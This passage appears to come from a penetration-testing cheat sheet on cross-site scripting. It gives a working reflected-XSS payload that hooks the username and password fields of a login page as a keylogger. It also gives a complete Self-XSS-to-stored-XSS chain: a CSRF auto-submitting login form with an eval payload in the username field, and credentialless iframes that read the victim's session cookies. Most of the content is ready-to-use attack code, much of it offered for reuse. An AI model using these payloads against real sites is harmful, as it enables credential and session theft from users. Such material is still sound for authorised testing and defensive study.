## XSS Keylogger
- [Escalating XSS](https://www.linkedin.com/posts/florian-ethical-hacker_escalating-xss-during-a-recent-pentest-activity-7355492287549779968-Ui20?utm_source=share&utm_medium=member_android&rcm=ACoAACnP0IABZSB2JmWSbESElQ3AjiJztsp0gN8)

```js
/login.jsp?&access_token=adasdas<@urlencode>');window.addEventListener('DOMContentLoaded', () => { ['user_name', 'user_password'].forEach(n => { const input = document.querySelector(`input[name=${n}]`); if (input) { input.addEventListener('input', e => console.log(n + ': ' + e.target.value)); } }); });</script></@urlencode>
```

## Self-XSS + CSRF
- [Self-XSS + CSRF](https://blog.slonser.info/posts/make-self-xss-great-again/)

The main idea is: `Stored Self-XSS => Stored XSS`. How? ``credentialless iframe``. **Credentialless iframes are same-origin with regular iframes**
```html
<iframe src="http://victim.domain/" width="40%" height="500px" credentialless></iframe>
<iframe src="http://victim.domain/" width="40%" height="500px"></iframe>
```
1. Create CSRF login form:
```html
<html>
<body>
  <form action="http://victim.domain/login" method="POST">
    <input type="hidden" name="username" value="attacker_username<img src=x onerror=eval(window.name)>" />
    <input type="hidden" name="password" value="Super_s@fe_password" />
    <input type="submit" value="Submit request" />
  </form>
  <script>
    document.forms[0].submit();
  </script>
</body>
</html>
```
2. Direct the target to the following page:
```html
<iframe name="window.top[1].document.body.innerHTML = 'edited by slonser</br>' + 'Our cookie is: ' + document.cookie + '\nVictim cookie is: ' + window.top[1].document.cookie;" src="./logi-csrf-poc.html" width="40%" height="500px" credentialless></iframe>
<iframe src="http://localhost:3004/" width="40%" height="500px"></iframe>
```